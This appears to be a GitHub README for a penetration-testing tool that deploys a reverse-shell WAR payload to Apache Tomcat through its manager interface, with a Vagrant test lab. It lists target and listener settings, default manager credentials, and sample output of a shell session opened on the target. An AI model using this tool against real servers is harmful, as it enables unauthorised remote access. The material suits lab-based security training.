# Tomcat Reverse Shell 🐱‍🐉

🚀 This repository contains a Python script for generating and deploying a Tomcat reverse shell payload, along with a Vagrant-based lab environment for testing it. This project is intended for ethical penetration testers, CTF players, and security researchers.🕵️‍♂️👾

## Getting Started 🏁

Let's dive right in! Follow these steps to set up both the testing environment and the Python script environment.

### Setting Up the Lab Environment 🧪

Follow these instructions to set up both the testing environment and the Python script environment.

1. Install [Vagrant](https://www.vagrantup.com/downloads) on your local machine.📦

2. Clone this repository to your local machine.

```bash
   git clone https://github.com/m-abdenni/tomcat_revshell.git
```

3. Change to the lab directory.

```bash
   cd tomcat_revshell/lab
```

4. Run the following command to provision the Vagrant environment.

```bash
   vagrant up
```
That's it! The lab environment will be configured, and you can access it using Vagrant commands. 🎉

> Note: The default credentials for accessing the Tomcat manager web application (/manager/html) are tomcat (username) and s3cret (password). Please ensure these are correct if you intend to use the manager web application for deployment. 🔐

### Setting Up the Python Script Environment 🐍

1. Install Python 3 on your local machine if you haven't already.🐍

2. Create a virtual environment and activate it.

```bash
   python3 -m venv venv
   source venv/bin/activate  # On Windows, use `venv\Scripts\activate`
```

3. Install the required Python packages.

```bash
   pip install -r requirements.txt
```

## Usage 🚀

Before running the Python script `main.py`, make sure to configure the following required parameters in the script according to your environment:

```bash
   # Required params
   rhost = "192.168.56.10"  # Replace with the IP address of your target Tomcat server
   rport = 8080             # Replace with the port of your target Tomcat server
   lhost = "192.168.56.1"   # Replace with your local IP address
   lport = 8888             # Replace with your desired local port
   username = "tomcat"      # Replace with the Tomcat username (if applicable)
   password = "s3cret"      # Replace with the Tomcat password (if applicable)
   shell_name = "revshell"  # Replace with your desired reverse shell name
```

* Once you've configured these parameters to match your environment, you can proceed with running the script as mentioned earlier.✅

> Make sure the parameters are set correctly to ensure proper functionality.🛠️

```bash
   python main.py
```

Here's an example of the script's output when successfully connected to the target server:

```bash
[+] WAR file uploaded and deployed successfully.
[+] Listener started on 192.168.56.1:8888
[+] Trying to bind to 192.168.56.1 on port 8888: Done
[+] Waiting for connections on 192.168.56.1:8888: Got connection from 192.168.56.10 on port 49326
bash: cannot set terminal process group (6517): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@ubuntu-focal:/$ id
id
uid=1002(tomcat) gid=1002(tomcat) groups=1002(tomcat)
tomcat@ubuntu-focal:/$ whoami
whoami
tomcat
tomcat@ubuntu-focal:/$ exit
[!] Exiting...
[!] Cleaning...
[*] Deleted index.jsp
[*] Deleted revshell.war
[*] Undeployed the revshell.
```

## Contribution and Future Updates 🌟

Contributions from the community are highly appreciated and play a crucial role in the growth of this project. Here's how you can contribute:

- **Bug Fixes:** If you encounter any issues or bugs while using the script or the lab environment, please open an issue on this repository.🐞

- **Enhancements:** Have ideas to improve this project? You can submit a pull request with your enhancements or features.🌟

- **Documentation:** Help improve the documentation by adding examples or clarifying existing instructions.📖

- **Security Improvements:** If you have expertise in security, your insights are valuable. Feel free to suggest security enhancements or best practices.🔒

Your contributions are essential in making this tool more robust and effective.💪

Stay tuned for future releases, and don't hesitate to share your ideas, suggestions, or contributions to further enhance this project.🚀🔮
